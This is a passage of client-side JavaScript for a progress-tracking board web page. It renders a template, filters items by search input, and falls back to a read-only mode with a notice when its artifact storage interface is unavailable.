    var tpl = document.getElementById("board-shell");
    document.getElementById("app").appendChild(tpl.content.cloneNode(true));

    flagEl = document.getElementById("saveflag");
    document.getElementById("search").addEventListener("input", function (ev) {
      filters.q = ev.target.value.trim().toLowerCase();
      renderBoard();
    });

    buildFilters();
    renderAccept();
    renderBoard();
  }

  function connect() {
    var p;
    try {
      p = (typeof claude !== "undefined" && claude.use) ? claude.use("artifact") : Promise.resolve(null);
    } catch (err) {
      p = Promise.resolve(null);
    }
    Promise.resolve(p).then(function (ns) {
      saver = ns || null;
      if (!saver) {
        readOnly = true;
        setFlag("off", "Not saving");
        showBanner("This copy of the board cannot save changes — you are looking at a preview or an export. Open the published board link to track progress.");
        renderBoard();
        return;
      }
      setFlag("saved", "Saved to board");
    }).catch(function () {
      saver = null;
      readOnly = true;
      setFlag("off", "Not saving");
      renderBoard();
    });
  }

  mount();
  connect();
})();
</script>
